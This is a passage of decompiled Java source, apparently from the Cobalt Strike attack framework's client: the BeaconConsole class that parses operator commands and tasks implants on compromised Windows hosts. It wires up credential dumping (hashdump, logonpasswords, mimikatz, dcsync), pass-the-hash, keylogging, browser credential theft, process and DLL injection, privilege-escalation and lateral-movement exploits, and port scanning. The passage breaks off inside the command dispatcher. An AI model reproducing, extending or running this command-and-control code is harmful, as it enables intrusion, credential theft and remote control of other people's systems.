package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.Prefs;
import aggressor.WindowCleanup;
import aggressor.dialogs.ScListenerChooser;
import beacon.BeaconCommands;
import beacon.BeaconElevators;
import beacon.BeaconExploits;
import beacon.BeaconRemoteExecMethods;
import beacon.BeaconRemoteExploits;
import beacon.BeaconTabCompletion;
import beacon.Registry;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.BeaconOutput;
import common.Callback;
import common.CommandParser;
import common.CommonUtils;
import common.StringStack;
import common.TeamQueue;
import console.ActivityConsole;
import console.Colors;
import console.Console;
import console.ConsolePopup;
import console.GenericTabCompletion;
import cortana.Cortana;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Stack;
import javax.swing.JTextField;
import sleep.runtime.SleepUtils;

public class BeaconConsole extends AObject implements ActionListener, ConsolePopup, Callback {
   protected Console console;
   protected TeamQueue conn;
   protected Cortana engine;
   protected DataManager data;
   protected WindowCleanup state;
   protected String bid;
   protected TaskBeacon master;
   protected AggressorClient client;

   public BeaconConsole(String var1, AggressorClient var2) {
      this(var1, var2, var2.getData(), var2.getScriptEngine(), var2.getConnection());
   }

   public String getPrompt() {
      return Colors.underline("beacon") + "> ";
   }

   public String Script(String var1) {
      return "BEACON_" + var1;
   }

   public BeaconConsole(String var1, AggressorClient var2, DataManager var3, Cortana var4, TeamQueue var5) {
      this.console = null;
      this.conn = null;
      this.engine = null;
      this.data = null;
      this.state = null;
      this.master = null;
      this.client = null;
      this.engine = var4;
      this.conn = var5;
      this.data = var3;
      this.bid = var1;
      this.client = var2;
      this.master = new TaskBeacon(var2, var3, var5, new String[]{var1});
      this.console = new ActivityConsole(true);
      this.console.setBeaconID(var1);
      this.console.updatePrompt(this.getPrompt());
      this.console.getInput().addActionListener(this);
      StringBuffer var6 = new StringBuffer();
      Iterator var7 = DataUtils.getBeaconTranscriptAndSubscribe(var3, var1, this).iterator();

      String var9;
      while(var7.hasNext()) {
         BeaconOutput var8 = (BeaconOutput)var7.next();
         var9 = this.format(var8);
         if (var9 != null) {
            var6.append(this.A(var8) + var9 + "\n");
         }
      }

      this.console.append(var6.toString());
      var3.subscribe("beacons", this);
      BeaconEntry var11 = DataUtils.getBeacon(var3, var1);
      if (var11 != null) {
         var9 = var4.format(this.Script("SBAR_LEFT"), var11.eventArguments());
         String var10 = var4.format(this.Script("SBAR_RIGHT"), var11.eventArguments());
         this.console.getStatusBar().set(var9, var10);
      }

      this.getTabCompletion();
      this.console.setPopupMenu(this);
   }

   public GenericTabCompletion getTabCompletion() {
      return new BeaconTabCompletion(this.bid, this.client, this.console);
   }

   public ActionListener cleanup() {
      return this.data.unsubOnClose("beacons, beaconlog", this);
   }

   public Console getConsole() {
      return this.console;
   }

   public void result(String var1, Object var2) {
      String var4;
      if (var1.equals("beacons") && this.console.isShowing()) {
         BeaconEntry var6 = DataUtils.getBeaconFromResult(var2, this.bid);
         if (var6 == null) {
            return;
         }

         var4 = this.engine.format(this.Script("SBAR_LEFT"), var6.eventArguments());
         String var5 = this.engine.format(this.Script("SBAR_RIGHT"), var6.eventArguments());
         this.console.getStatusBar().left(var4);
         this.console.getStatusBar().right(var5);
      } else if (var1.equals("beaconlog")) {
         BeaconOutput var3 = (BeaconOutput)var2;
         if (var3.is(this.bid)) {
            var4 = this.format(var3);
            if (var4 != null) {
               this.console.append(this.A(var3) + var4 + "\n");
            }
         }
      }

   }

   private final String A(BeaconOutput var1) {
      if (Prefs.getPreferences().isSet("console.showtimestamp.boolean", false)) {
         Stack var2 = new Stack();
         var2.push(SleepUtils.getScalar(var1.tactic));
         var2.push(SleepUtils.getScalar(var1.when));
         var2.push(SleepUtils.getScalar(var1.text));
         var2.push(SleepUtils.getScalar(var1.from));
         var2.push(SleepUtils.getScalar(var1.bid));
         String var3 = this.engine.format(this.Script("CONSOLE_TIMESTAMP"), var2);
         return var3;
      } else {
         return "";
      }
   }

   public String format(BeaconOutput var1) {
      return this.engine.format(var1.eventName().toUpperCase(), var1.eventArguments());
   }

   public void showPopup(String var1, MouseEvent var2) {
      Stack var3 = new Stack();
      LinkedList var4 = new LinkedList();
      var4.add(this.bid);
      var3.push(SleepUtils.getArrayWrapper(var4));
      this.engine.getMenuBuilder().installMenu(var2, "beacon", var3);
   }

   public String formatLocal(BeaconOutput var1) {
      var1.from = DataUtils.getNick(this.data);
      return this.format(var1);
   }

   public boolean isVistaAndLater() {
      BeaconEntry var1 = DataUtils.getBeacon(this.data, this.bid);
      if (var1 != null) {
         return var1.getVersion() >= 6.0;
      } else {
         return false;
      }
   }

   public boolean is8AndLater() {
      BeaconEntry var1 = DataUtils.getBeacon(this.data, this.bid);
      if (var1 != null) {
         return var1.getVersion() >= 6.2;
      } else {
         return false;
      }
   }

   private void B(CommandParser var1, int var2, String var3) {
      String var4;
      if (var1.verify("VZ")) {
         var1.popString();
         var4 = var1.popString();
         var1.reset();
         String var5;
         String var6;
         if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", var4)) {
            var1.verify("VZ");
            var5 = var1.popString();
            var6 = var1.popString();
            this.master.NetView(var6, var5, (String)null, var2, var3);
         } else if (CommonUtils.contains("group, localgroup, user", var4)) {
            if (var1.verify("VAZ")) {
               var1.reset();
               if (var1.verify("VUZ")) {
                  var5 = var1.popString();
                  var6 = var1.popString();
                  String var7 = var1.popString();
                  this.master.NetView(var7, var6, var5, var2, var3);
               }
            } else if (var1.isMissingArguments() && var1.verify("VZ")) {
               var1.reset();
               if (!var1.verify("VU") && !var1.reset()) {
                  if (var1.verify("VZ")) {
                     var5 = var1.popString();
                     var6 = var1.popString();
                     this.master.NetView(var6, "localhost", var5, var2, var3);
                  }
               } else {
                  var5 = var1.popString();
                  var6 = var1.popString();
                  this.master.NetView(var6, var5, (String)null, var2, var3);
               }
            }
         } else if (CommonUtils.contains("share, sessions, logons, time", var4) && var1.verify("VU")) {
            var5 = var1.popString();
            var6 = var1.popString();
            this.master.NetView(var6, var5, (String)null, var2, var3);
         }
      } else if (var1.isMissingArguments() && var1.verify("V")) {
         var4 = var1.popString();
         if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", var4)) {
            this.master.NetView(var4, (String)null, (String)null, var2, var3);
         } else {
            this.master.NetView(var4, "localhost", (String)null, var2, var3);
         }
      }

   }

   private void E(CommandParser var1, int var2, String var3) {
      String var5;
      String var6;
      if (var1.verify("TRDI")) {
         int var4 = var1.popInt();
         var5 = var1.popString();
         var6 = var1.popString();
         String var7 = var1.popString();
         this.master.PortScan(var7, var6, var5, var4, var2, var3);
      } else {
         String var8;
         if (var1.isMissingArguments() && var1.verify("TRD")) {
            var8 = var1.popString();
            var5 = var1.popString();
            var6 = var1.popString();
            this.master.PortScan(var6, var5, var8, 1024, var2, var3);
         } else if (var1.isMissingArguments() && var1.verify("TR")) {
            var8 = var1.popString();
            var5 = var1.popString();
            this.master.PortScan(var5, var8, "icmp", 1024, var2, var3);
         } else if (var1.isMissingArguments() && var1.verify("T")) {
            var8 = var1.popString();
            this.master.PortScan(var8, "1-1024,3389,5900-6000", "icmp", 1024, var2, var3);
         }
      }

   }

   private void D(CommandParser var1, int var2, String var3) {
      if (var1.verify("AAZ")) {
         String var4 = var1.popString();
         String var5 = var1.popString();
         String var6 = var1.popString();
         String var7 = CommonUtils.Host(var6);
         int var8 = CommonUtils.Port(var6, 22);
         this.master.SecureShell(var5, var4, var7, var8, var2, var3);
      }

   }

   private void C(CommandParser var1, final int var2, final String var3) {
      final String var4;
      String var5;
      final String var6;
      if (var1.verify("AAF")) {
         var4 = var1.popString();
         var5 = var1.popString();
         var6 = var1.popString();
         String var7 = CommonUtils.Host(var6);
         int var8 = CommonUtils.Port(var6, 22);
         byte[] var9 = CommonUtils.readFile(var4);
         if (var9.length > 6140) {
            var1.error("key file " + var4 + " is too large");
         } else {
            this.master.SecureShellPubKey(var5, var9, var7, var8, var2, var3);
         }
      } else if (var1.isMissingArguments() && var1.verify("AA")) {
         var4 = var1.popString();
         var5 = var1.popString();
         var6 = CommonUtils.Host(var5);
         final int var10 = CommonUtils.Port(var5, 22);
         SafeDialogs.openFile("Select PEM file", (String)null, (String)null, false, false, new SafeDialogCallback() {
            public void dialogResult(String var1) {
               byte[] var3x = CommonUtils.readFile(var1);
               BeaconConsole.this.master.SecureShellPubKey(var4, var3x, var6, var10, var2, var3);
            }
         });
      }

   }

   private void A(CommandParser var1, int var2, String var3) {
      String var4;
      if (var1.verify("AA")) {
         var4 = var1.popString();
         String var5 = var1.popString();
         this.master.DcSync(var5, var4, var2, var3);
      } else if (var1.isMissingArguments() && var1.verify("A")) {
         var4 = var1.popString();
         this.master.DcSync(var4, var2, var3);
      }

   }

   private void F(CommandParser var1, int var2, String var3) {
      if (var1.verify("AH")) {
         String var4 = var1.popString();
         String var5 = var1.popString();
         if (var5.indexOf("\\") == -1) {
            this.master.PassTheHash(".", var5, var4, var2, var3);
         } else {
            StringStack var6 = new StringStack(var5, "\\");
            String var7 = var6.shift();
            String var8 = var6.shift();
            this.master.PassTheHash(var7, var8, var4, var2, var3);
         }
      }

   }

   public void actionPerformed(ActionEvent var1) {
      String var2 = var1.getActionCommand().trim();
      ((JTextField)var1.getSource()).setText("");

      try {
         String var3 = this.console.processHistoryBang(var2);
         if (!var3.isEmpty()) {
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
            var2 = var3;
         }
      } catch (Exception var10) {
         this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
         this.console.append(this.formatLocal(BeaconOutput.Error(this.bid, var10.getMessage())) + "\n");
         return;
      }

      this.console.addCommandToHistory(var2);
      CommandParser var11 = new CommandParser(var2);
      if (this.client.getAliases().isAlias(var11.getCommand())) {
         this.master.input(var2);
         this.client.getAliases().fireCommand(this.bid, var11.getCommand(), var11.getArguments());
      } else {
         final String var4;
         if (!var11.is("help") && !var11.is("?")) {
            final int var14;
            if (var11.is("history")) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               var14 = var11.popHistoryArgument();
               if (var11.hasError()) {
                  this.console.append(this.formatLocal(BeaconOutput.Error(this.bid, var11.error())) + "\n");
               } else {
                  this.getConsole().showHistory(var14);
               }

            } else if (var11.is("downloads")) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.conn.call("beacons.downloads", CommonUtils.args(this.bid), new Callback() {
                  public void result(String var1, Object var2) {
                     Stack var3 = new Stack();
                     var3.push(CommonUtils.convertAll(var2));
                     var3.push(SleepUtils.getScalar(BeaconConsole.this.bid));
                     BeaconConsole.this.console.append(BeaconConsole.this.engine.format("BEACON_OUTPUT_DOWNLOADS", var3) + "\n");
                  }
               });
            } else if (var11.is("elevate") && var11.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_EXPLOITS", new Stack()) + "\n");
            } else if (var11.is("runasadmin") && var11.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_ELEVATORS", new Stack()) + "\n");
            } else if (var11.is("remote-exec") && var11.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXEC_METHODS", new Stack()) + "\n");
            } else if (var11.is("jump") && var11.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXPLOITS", new Stack()) + "\n");
            } else {
               this.master.input(var2);
               final String var12;
               if (var11.is("argue")) {
                  if (!this.isVistaAndLater()) {
                     var11.error("Target is not Windows Vista or later");
                  } else if (!var11.verify("AZ") && !var11.reset()) {
                     if (!var11.verify("A") && !var11.reset()) {
                        this.master.SpoofArgsList();
                     } else {
                        var4 = var11.popString();
                        this.master.SpoofArgsRemove(var4);
                     }
                  } else {
                     var4 = var11.popString();
                     var12 = var11.popString();
                     this.master.SpoofArgsAdd(var12, var4);
                  }
               } else if (var11.is("blockdlls")) {
                  if (!this.is8AndLater()) {
                     var11.error("Target is not Windows 8 or later");
                  } else if (var11.empty()) {
                     this.master.BlockDLLs(true);
                  } else if (var11.verify("?")) {
                     this.master.BlockDLLs(var11.popBoolean());
                  }
               } else {
                  final int var13;
                  if (var11.is("browserpivot")) {
                     if (!var11.verify("IX") && !var11.reset()) {
                        if (!var11.verify("I") && !var11.reset()) {
                           if (var11.verify("?") && !var11.popBoolean()) {
                              this.master.BrowserPivotStop();
                           }
                        } else {
                           this.master.BrowserPivot(var11.popInt(), "x86");
                        }
                     } else {
                        var4 = var11.popString();
                        var13 = var11.popInt();
                        this.master.BrowserPivot(var13, var4);
                     }
                  } else if (var11.is("cancel")) {
                     if (var11.verify("Z")) {
                        this.master.Cancel(var11.popString());
                     }
                  } else if (var11.is("cd")) {
                     if (var11.verify("Z")) {
                        this.master.Cd(var11.popString());
                     }
                  } else if (var11.is("checkin")) {
                     this.master.Checkin();
                  } else if (var11.is("chromedump")) {
                     if (var11.empty()) {
                        this.master.ChromeDump(-1, (String)null);
                     } else if (var11.verify("IX")) {
                        var4 = var11.popString();
                        var13 = var11.popInt();
                        this.master.ChromeDump(var13, var4);
                     }
                  } else if (var11.is("clear")) {
                     this.master.Clear();
                  } else if (var11.is("connect")) {
                     if (!var11.verify("AI") && !var11.reset()) {
                        if (var11.verify("Z")) {
                           var4 = var11.popString();
                           this.master.Connect(var4);
                        }
                     } else {
                        var14 = var11.popInt();
                        var12 = var11.popString();
                        this.master.Connect(var12, var14);
                     }
                  } else {
                     BeaconEntry var15;
                     final String var16;
                     if (var11.is("covertvpn")) {
                        var15 = DataUtils.getBeacon(this.data, this.bid);
                        if (var11.verify("AA")) {
                           var12 = var11.popString();
                           var16 = var11.popString();
                           this.master.CovertVPN(var16, var12);
                        } else if (var11.isMissingArguments() && var11.verify("A")) {
                           var12 = var11.popString();
                           this.master.CovertVPN(var12, var15.getInternal());
                        }
                     } else if (var11.is("cp")) {
                        if (var11.verify("BB")) {
                           var4 = var11.popString();
                           var12 = var11.popString();
                           this.master.Copy(var12, var4);
                        }
                     } else {
                        CommandParser var7;
                        int var17;
                        if (var11.is("dcsync")) {
                           if (!var11.verify("IXZ") && !var11.reset()) {
                              if (!var11.verify("IZ") && !var11.reset()) {
                                 this.A(var11, -1, (String)null);
                              } else {
                                 var11.error("argument architecture is not valid set to x86 or x64");
                              }
                           } else {
                              var4 = var11.popString();
                              var12 = var11.popString();
                              var17 = var11.popInt();
                              var11.reset();
                              var7 = new CommandParser("dcsync " + var4);
                              this.A(var7, var17, var12);
                              if (var7.hasError()) {
                                 var11.error(var7.error());
                              }
                           }
                        } else if (var11.is("desktop")) {
                           if (!var11.verify("IXQ") && !var11.reset()) {
                              if (!var11.verify("IX") && !var11.reset()) {
                                 if (!var11.verify("IQ") && !var11.reset()) {
                                    if (!var11.verify("I") && !var11.reset()) {
                                       if (var11.verify("Q")) {
                                          var4 = var11.popString();
                                          this.master.Desktop(var4.equals("high"));
                                       } else if (var11.isMissingArguments()) {
                                          this.master.Desktop(true);
                                       }
                                    } else {
                                       var14 = var11.popInt();
                                       this.master.Desktop(var14, "x86", true);
                                    }
                                 } else {
                                    var4 = var11.popString();
                                    var13 = var11.popInt();
                                    this.master.Desktop(var13, "x86", var4.equals("high"));
                                 }
                              } else {
                                 var4 = var11.popString();
                                 var13 = var11.popInt();
                                 this.master.Desktop(var13, var4, true);
                              }
                           } else {
                              var4 = var11.popString();
                              var12 = var11.popString();
                              var17 = var11.popInt();
                              this.master.Desktop(var17, var12, var4.equals("high"));
                           }
                        } else if (var11.is("dllinject")) {
                           if (var11.verify("IF")) {
                              var4 = var11.popString();
                              var13 = var11.popInt();
                              this.master.DllInject(var13, var4);
                           } else if (var11.isMissingArguments() && var11.verify("I")) {
                              var14 = var11.popInt();
                              SafeDialogs.openFile("Select Reflective DLL", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                 public void dialogResult(String var1) {
                                    BeaconConsole.this.master.DllInject(var14, var1);
                                 }
                              });
                           }
                        } else if (var11.is("dllload")) {
                           if (var11.verify("IZ")) {
                              var4 = var11.popString();
                              var13 = var11.popInt();
                              this.master.DllLoad(var13, var4);
                           }
                        } else if (var11.is("download")) {
                           if (var11.verify("Z")) {
                              this.master.Download(var11.popString());
                           }
                        } else if (var11.is("drives")) {
                           this.master.Drives();
                        } else {
                           ScListenerChooser var19;
                           if (var11.is("elevate")) {
                              BeaconExploits var24 = DataUtils.getBeaconExploits(this.data);
                              if (var11.verify("AL")) {
                                 var12 = var11.popString();
                                 var16 = var11.popString();
                                 if (var24.isExploit(var16)) {
                                    this.master.Elevate(var16, var12);
                                 } else {
                                    var11.error("no such exploit '" + var16 + "'");
                                 }
                              } else if (var11.isMissingArguments() && var11.verify("A")) {
                                 var12 = var11.popString();
                                 if (var24.isExploit(var12)) {
                                    var19 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                       public void dialogResult(String var1) {
                                          BeaconConsole.this.master.Elevate(var12, var1);
                                       }
                                    });
                                    var19.show();
                                 } else {
                                    var11.error("no such exploit '" + var12 + "'");
                                 }
                              }
                           } else if (var11.is("execute")) {
                              if (var11.verify("Z")) {
                                 this.master.Execute(var11.popString());
                              }
                           } else if (var11.is("execute-assembly")) {
                              if (var11.verify("pZ")) {
                                 var4 = var11.popString();
                                 var12 = var11.popString();
                                 this.master.ExecuteAssembly(var12, var4);
                              } else if (var11.isMissingArguments() && var11.verify("F")) {
                                 var4 = var11.popString();
                                 this.master.ExecuteAssembly(var4, "");
                              }
                           } else if (var11.is("exit")) {
                              this.master.Die();
                           } else if (var11.is("getprivs")) {
                              this.master.GetPrivs();
                           } else if (var11.is("getsystem")) {
                              if (!this.isVistaAndLater()) {
                                 var11.error("Target is not Windows Vista or later");
                              } else {
                                 this.master.GetSystem();
                              }
                           } else if (var11.is("getuid")) {
                              this.master.GetUID();
                           } else if (var11.is("hashdump")) {
                              var15 = DataUtils.getBeacon(this.data, this.bid);
                              if (!var15.isAdmin()) {
                                 var11.error("this command requires administrator privileges");
                              } else if (var11.empty()) {
                                 this.master.Hashdump();
                              } else if (var11.verify("IX")) {
                                 var12 = var11.popString();
                                 var17 = var11.popInt();
                                 this.master.Hashdump(var17, var12);
                              }
                           } else {
                              ScListenerChooser var27;
                              if (var11.is("inject")) {
                                 if (!var11.verify("IXL") && !var11.reset()) {
                                    if (!var11.verify("IX") && !var11.reset()) {
                                       if (var11.verify("IL")) {
                                          var4 = var11.popString();
                                          var13 = var11.popInt();
                                          this.master.Inject(var13, var4, "x86");
                                       } else if (var11.isMissingArguments() && var11.verify("I")) {
                                          var14 = var11.popInt();
                                          var27 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                             public void dialogResult(String var1) {
                                                BeaconConsole.this.master.Inject(var14, var1, "x86");
                                             }
                                          });
                                          var27.show();
                                       }
                                    } else {
                                       var4 = var11.popString();
                                       var13 = var11.popInt();
                                       var19 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                          public void dialogResult(String var1) {
                                             BeaconConsole.this.master.Inject(var13, var1, var4);
                                          }
                                       });
                                       var19.show();
                                    }
                                 } else {
                                    var4 = var11.popString();
                                    var12 = var11.popString();
                                    var17 = var11.popInt();
                                    this.master.Inject(var17, var4, var12);
                                 }
                              } else if (var11.is("inline-execute")) {
                                 if (var11.verify("pZ")) {
                                    var4 = var11.popString();
                                    var12 = var11.popString();
                                    this.master.InlineExecuteObject(var12, var4);
                                 } else if (var11.isMissingArguments() && var11.verify("F")) {
                                    var4 = var11.popString();
                                    this.master.InlineExecuteObject(var4, (String)null);
                                 }
                              } else if (var11.is("jobkill")) {
                                 if (var11.verify("I")) {
                                    var14 = var11.popInt();
                                    this.master.JobKill(var14);
                                 }
                              } else if (var11.is("jobs")) {
                                 this.master.Jobs();
                              } else {
                                 String var18;
                                 if (var11.is("jump")) {
                                    BeaconRemoteExploits var28 = DataUtils.getBeaconRemoteExploits(this.data);
                                    if (var11.verify("AAL")) {
                                       var12 = var11.popString();
                                       var16 = var11.popString();
                                       var18 = var11.popString();
                                       if (var28.isExploit(var18)) {
                                          this.master.Jump(var18, var16, var12);
                                       } else {
                                          var11.error("no such exploit '" + var18 + "'");
                                       }
                                    } else if (var11.isMissingArguments() && var11.verify("AA")) {
                                       var12 = var11.popString();
                                       var16 = var11.popString();
                                       if (var28.isExploit(var16)) {
                                          ScListenerChooser var20 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                             public void dialogResult(String var1) {
                                                BeaconConsole.this.master.Jump(var16, var12, var1);
                                             }
                                          });
                                          var20.show();
                                       } else {
                                          var11.error("no such exploit '" + var16 + "'");
                                       }
                                    }
                                 } else if (var11.is("kerberos_ticket_purge")) {
                                    this.master.KerberosTicketPurge();
                                 } else if (var11.is("kerberos_ccache_use") && var11.empty()) {
                                    SafeDialogs.openFile("Select ticket to use", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                       public void dialogResult(String var1) {
                                          BeaconConsole.this.master.KerberosCCacheUse(var1);
                                       }
                                    });
                                 } else if (var11.is("kerberos_ccache_use")) {
                                    if (var11.verify("F")) {
                                       this.master.KerberosCCacheUse(var11.popString());
                                    }
                                 } else if (var11.is("kerberos_ticket_use") && var11.empty()) {
                                    SafeDialogs.openFile("Select ticket to use", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                       public void dialogResult(String var1) {
                                          BeaconConsole.this.master.KerberosTicketUse(var1);
                                       }
                                    });
                                 } else if (var11.is("kerberos_ticket_use")) {
                                    if (var11.verify("F")) {
                                       this.master.KerberosTicketUse(var11.popString());
                                    }
                                 } else if (var11.is("keylogger")) {
                                    if (var11.empty()) {
                                       this.master.KeyLogger();
                                    } else if (!var11.verify("IX") && !var11.reset()) {
                                       if (var11.verify("I")) {
                                          this.master.KeyLogger(var11.popInt(), "x86");
                                       }
                                    } else {
                                       var4 = var11.popString();
                                       var13 = var11.popInt();
                                       this.master.KeyLogger(var13, var4);
                                    }
                                 } else if (var11.is("kill")) {
                                    if (var11.verify("I")) {
                                       this.master.Kill(var11.popInt());
                                    }
                                 } else if (var11.is("link")) {
                                    if (!var11.verify("AA") && !var11.reset()) {
                                       if (var11.verify("Z")) {
                                          var4 = var11.popString();
                                          var12 = DataUtils.getDefaultPipeName(this.client.getData(), var4);
                                          this.master.Link(var12);
                                       }
                                    } else {
                                       var4 = var11.popString();
                                       var12 = var11.popString();
                                       this.master.Link("\\\\" + var12 + "\\pipe\\" + var4);
                                    }
                                 } else if (var11.is("logonpasswords")) {
                                    var15 = DataUtils.getBeacon(this.data, this.bid);
                                    if (!var15.isAdmin()) {
                                       var11.error("this command requires administrator privileges");
                                    } else if (var11.empty()) {
                                       this.master.LogonPasswords(-1, (String)null);
                                    } else if (var11.verify("IX")) {
                                       var12 = var11.popString();
                                       var17 = var11.popInt();
                                       this.master.LogonPasswords(var17, var12);
                                    }
                                 } else if (var11.is("ls")) {
                                    if (!var11.verify("Z") && !var11.reset()) {
                                       this.master.Ls(".");
                                    } else {
                                       this.master.Ls(var11.popString());
                                    }
                                 } else {
                                    String var8;
                                    if (var11.is("make_token")) {
                                       if (var11.verify("AZ")) {
                                          var4 = var11.popString();
                                          var12 = var11.popString();
                                          if (var12.indexOf("\\") == -1) {
                                             this.master.LoginUser(".", var12, var4);
                                          } else {
                                             StringStack var25 = new StringStack(var12, "\\");
                                             var18 = var25.shift();
                                             var8 = var25.shift();
                                             this.master.LoginUser(var18, var8, var4);
                                          }
                                       }
                                    } else if (var11.is("message")) {
                                       if (var11.verify("Z")) {
                                          this.master.Message(var11.popString());
                                       }
                                    } else if (var11.is("mimikatz")) {
                                       if (!var11.verify("IXZ") && !var11.reset()) {
                                          if (!var11.verify("IZ") && !var11.reset()) {
                                             if (var11.verify("Z")) {
                                                this.master.Mimikatz(var11.popString(), -1, (String)null);
                                             }
                                          } else {
                                             var11.error("argument architecture is not valid set to x86 or x64");
                                          }
                                       } else {
                                          var4 = var11.popString();
                                          var12 = var11.popString();
                                          var17 = var11.popInt();
                                          this.master.Mimikatz(var4, var17, var12);
                                       }
                                    } else if (var11.is("mkdir")) {
                                       if (var11.verify("Z")) {
                                          this.master.MkDir(var11.popString());
                                       }
                                    } else if (var11.is("mode")) {
                                       if (var11.verify("C")) {
                                          var4 = var11.popString();
                                          if (var4.equals("dns")) {
                                             this.master.ModeDNS();
                                          } else if (var4.equals("dns6")) {
                                             this.master.ModeDNS6();
                                          } else if (var4.equals("dns-txt")) {
                                             this.master.ModeDNS_TXT();
                                          } else if (var4.equals("http")) {
                                             this.master.ModeHTTP();
                                          }
                                       }
                                    } else if (var11.is("mv")) {
                                       if (var11.verify("BB")) {
                                          var4 = var11.popString();
                                          var12 = var11.popString();
                                          this.master.Move(var12, var4);
                                       }
                                    } else {
                                       int var21;
                                       CommandParser var22;
                                       if (var11.is("net")) {
                                          if (var11.verify("IXVZ")) {
                                             var4 = var11.popString();
                                             var12 = var11.popString();
                                             var16 = var11.popString();
                                             var21 = var11.popInt();
                                             var11.reset();
                                             var22 = new CommandParser("net " + var12 + " " + var4);
                                             this.B(var22, var21, var16);
                                             if (var22.hasError()) {
                                                var11.error(var22.error());
                                             }
                                          } else if (var11.isMissingArguments() && var11.verify("IXV")) {
                                             var4 = var11.popString();
                                             var12 = var11.popString();
                                             var17 = var11.popInt();
                                             var11.reset();
                                             var7 = new CommandParser("net " + var4);
                                             this.B(var7, var17, var12);
                                             if (var7.hasError()) {
                                                var11.error(var7.error());
                                             }
                                          } else {
                                             var11.reset();
                                             this.B(var11, -1, (String)null);
                                          }
                                       } else if (var11.is("note")) {
                                          if (var11.verify("Z")) {
                                             var4 = var11.popString();
                                             this.master.Note(var4);
                                          } else if (var11.isMissingArguments()) {
                                             this.master.Note("");
                                          }
                                       } else if (var11.is("portscan")) {
                                          if (var11.verify("IXZ")) {
                                             var4 = var11.popString();
                                             var12 = var11.popString();
                                             var17 = var11.popInt();
                                             var11.reset();
                                             var7 = new CommandParser("portscan " + var4);
                                             this.E(var7, var17, var12);
                                             if (var7.hasError()) {
                                                var11.error(var7.error());
                                             }
                                          } else {
                                             var11.reset();
                                             this.E(var11, -1, (String)null);
                                          }
                                       } else if (var11.is("powerpick")) {
                                          if (var11.verify("Z")) {
                                             this.master.PowerShellUnmanaged(var11.popString());
                                          }
                                       } else if (var11.is("powershell")) {
                                          if (var11.verify("Z")) {
                                             this.master.PowerShell(var11.popString());
                                          }
                                       } else if (var11.is("powershell-import") && var11.empty()) {
                                          SafeDialogs.openFile("Select script to import", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                             public void dialogResult(String var1) {
                                                BeaconConsole.this.master.PowerShellImport(var1);
                                             }
                                          });
                                       } else if (var11.is("powershell-import")) {
                                          if (var11.verify("f")) {
                                             this.master.PowerShellImport(var11.popString());
                                          }
                                       } else if (var11.is("ppid")) {
                                          if (!this.isVistaAndLater()) {
                                             var11.error("Target is not Windows Vista or later");
                                          } else if (var11.verify("I")) {
                                             this.master.PPID(var11.popInt());
                                          } else if (var11.isMissingArguments()) {
                                             this.master.PPID(0);
                                          }
                                       } else if (var11.is("printscreen")) {
                                          if (!var11.verify("IX") && !var11.reset()) {
                                             this.master.Printscreen();
                                          } else {
                                             var4 = var11.popString();
                                             var13 = var11.popInt();
                                             this.master.Printscreen(var13, var4);
                                          }
                                       } else if (var11.is("ps")) {
                                          this.master.Ps();
                                       } else if (var11.is("psinject")) {
                                          if (var11.verify("IXZ")) {
                                             var4 = var11.popString();
                                             var12 = var11.popString();
                                             var17 = var11.popInt();
                                             this.master.PsInject(var17, var12, var4);
                                          }
                                       } else if (var11.is("pth")) {
                                          var15 = DataUtils.getBeacon(this.data, this.bid);
                                          if (!var15.isAdmin()) {
                                             var11.error("this command requires administrator privileges");
                                          } else if (!var11.verify("IXZ") && !var11.reset()) {
                                             if (!var11.verify("IZ") && !var11.reset()) {
                                                this.F(var11, -1, (String)null);
                                             } else {
                                                var11.error("argument architecture is not valid set to x86 or x64");
                                             }
                                          } else {
                                             var12 = var11.popString();
                                             var16 = var11.popString();
                                             var21 = var11.popInt();
                                             var11.reset();
                                             var22 = new CommandParser("pth " + var12);
                                             this.F(var22, var21, var16);
                                             if (var22.hasError()) {
                                                var11.error(var22.error());
                                             }
                                          }
                                       } else if (var11.is("pwd")) {
                                          this.master.Pwd();
                                       } else if (var11.is("reg")) {
                                          if (var11.verify("gXZ")) {
                                             var4 = var11.popString();
                                             var12 = var11.popString();
                                             var16 = var11.popString();
                                             Registry var23 = new Registry(var12, var4, "queryv".equals(var16));
                                             if (!var23.isValid()) {
                                                var11.error(var23.getError());
                                             } else if ("queryv".equals(var16)) {
                                                this.master.RegQueryValue(var23);
                                             } else if ("query".equals(var16)) {
                                                this.master.RegQuery(var23);
                                             }
                                          }
                                       } else if (var11.is("remote-exec")) {
                                          BeaconRemoteExecMethods var29 = DataUtils.getBeaconRemoteExecMethods(this.data);
                                          if (var11.verify("AAZ")) {
                                             var12 = var11.popString();
                                             var16 = var11.popString();
                                             var18 = var11.popString();
                                             if (var29.isRemoteExecMethod(var18)) {
                                                this.master.RemoteExecute(var18, var16, var12);
                                             } else {
                                                var11.error("no such method '" + var18 + "'");
                                             }
                                          }
